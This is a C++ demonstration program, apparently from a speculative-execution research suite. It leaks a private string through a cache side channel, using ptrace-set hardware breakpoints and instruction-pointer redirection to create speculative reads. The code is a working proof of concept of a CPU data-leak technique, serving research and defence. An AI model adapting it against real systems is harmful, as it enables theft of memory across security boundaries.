/*
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/**
 * Demonstrates speculative execution over hardware breakpoint trap.
 * We fork the process and run the demonstration in the child, while the parent
 * takes care for setting up the breakpoints and moving the instruction pointer
 * over the dead code after the trap that is executed only speculatively.
 **/

#ifndef __linux__
#  error Unsupported OS. Linux required.
#endif

#if !defined(__i386__) && !defined(__x86_64__)
#  error Unsupported CPU. X86/64 required.
#endif

#include <array>
#include <cstring>
#include <fstream>
#include <iostream>

#include <signal.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <unistd.h>

#include "cache_sidechannel.h"
#include "instr.h"
#include "local_content.h"
#include "utils.h"

static char LeakByte(const char *data, size_t data_length, size_t offset) {
  CacheSideChannel sidechannel;
  const std::array<BigByte, 256> &oracle = sidechannel.GetOracle();

  for (int run = 0;; ++run) {
    size_t safe_offset = run % data_length;
    sidechannel.FlushOracle();

    // Successful access of the safe offset.
    ForceRead(oracle.data() + static_cast<size_t>(data[safe_offset]));

    // This access traps on hardware breakpoint and the tracer shifts the
    // instruction pointer to the afterspeculation label.
    ForceRead(oracle.data() + static_cast<size_t>(data[offset]));

    std::cout << "Dead code. Must not be printed." << std::endl;

    // The exit call must not be unconditional, otherwise clang would optimize
    // out everything that follows it and the linking would fail.
    if (strlen(public_data) != 0) {
      exit(EXIT_FAILURE);
    }

    // Tracer moves the instruction pointer to this label.
    asm volatile("afterspeculation:");

    std::pair<bool, char> result =
        sidechannel.RecomputeScores(public_data[safe_offset]);

    if (result.first) {
      return result.second;
    }

    if (run > 100000) {
      std::cerr << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

void ChildProcess() {
  // Precompute the length of private data, so that we don't have to access it
  // when it contains the hardware breakpoint.
  size_t private_data_length = strlen(private_data);
  // Similarly we have to precompute the length of public data, because on some
  // systems the __strlen_avx2 executed on public data can touch the breakpoint
  // in private data.
  size_t public_data_length = strlen(public_data);

  // Allow the parent to trace child's execution.
  int res = ptrace(PTRACE_TRACEME, 0, nullptr, nullptr);
  if (res == -1) {
    std::cerr << "PTRACE_TRACEME failed." << std::endl;
    exit(EXIT_FAILURE);
  }

  std::cout << "Leaking the string: ";
  std::cout.flush();
  const size_t private_offset = private_data - public_data;
  for (size_t i = 0; i < private_data_length; ++i) {
    // Synchronize with the parent. Let it setup the hardware breakpoint on the
    // next character.
    raise(SIGSTOP);
    MemoryAndSpeculationBarrier();
    std::cout << LeakByte(public_data, public_data_length, private_offset + i);
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
}

void ParentProcess(pid_t child) {
  // Index of the breakpoint in the private data.
  size_t index = 0;
  while (true) {
    int wstatus, res;
    wait(&wstatus);
    if (!WIFSTOPPED(wstatus)) {
      break;  // Unexpected wait event.
    }

    if (WSTOPSIG(wstatus) == SIGSTOP) {
      // Set debug registers.
      // The child stopped itself with "raise(SIGSTOP)". We have to put the
      // breakpoint on the current character of private_data and let it
      // continue.
      // Pointing dr0 on the current index in private_data.
      res = ptrace(PTRACE_POKEUSER, child, offsetof(user, u_debugreg[0]),
                   private_data + index);
      // Post-incrementing the index so that the first call is with index 0.
      ++index;
      if (res == -1) {
        std::cerr << "PTRACE_POKEUSER on dr0 failed." << std::endl;
        exit(EXIT_FAILURE);
      }

      // Setting the 0th, 15th and 16th bit in dr7.
      // 0th bit means the active breakpoint is in local dr0.
      // 15th and 16th bits mean the trap activates on each read and write.
      // We leave the length bits set to 00 so that we get one-byte
      // granularity.
      res = ptrace(PTRACE_POKEUSER, child, offsetof(user, u_debugreg[7]),
                   0x30001);
      if (res == -1) {
        std::cerr << "PTRACE_POKEUSER on dr7 failed." << errno << std::endl;
        exit(EXIT_FAILURE);
      }
    } else if (WSTOPSIG(wstatus) == SIGTRAP) {
      // Move instruction pointer.
      // The child was trapped by stepping on the hardware breakpoint. We just
      // move its instruction pointer to the afterspeculation label.
      user_regs_struct regs;
      // Read general purpose register values of the child.
      res = ptrace(PTRACE_GETREGS, child, nullptr, &regs);
      if (res == -1) {
        std::cerr << "PTRACE_GETREGS failed." << std::endl;
        exit(EXIT_FAILURE);
      }

      // Move the child's instruction pointer to afterspeculation.
#ifdef __x86_64__
      regs.rip = reinterpret_cast<size_t>(afterspeculation);
#else
      regs.eip = reinterpret_cast<size_t>(afterspeculation);
#endif

      // Store the shifted child's instruction pointer value.
      res = ptrace(PTRACE_SETREGS, child, nullptr, &regs);
      if (res == -1) {
        std::cerr << "PTRACE_SETREGS failed." << std::endl;
        exit(EXIT_FAILURE);
      }
    } else {
      // Unexpected signal received by the child.
      // The child didn't stop with SIGSTOP nor SIGTRAP.
      // Terminating the parent.
      break;
    }

    // Wake up the child.
    res = ptrace(PTRACE_CONT, child, nullptr, nullptr);
    if (res == -1) {
      std::cerr << "PTRACE_CONT after signal failed." << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

int main() {
  pid_t pid = fork();
  if (pid == 0) {
    // Tracee.
    ChildProcess();
  } else {
    // Tracer.
    ParentProcess(pid);
  }
}
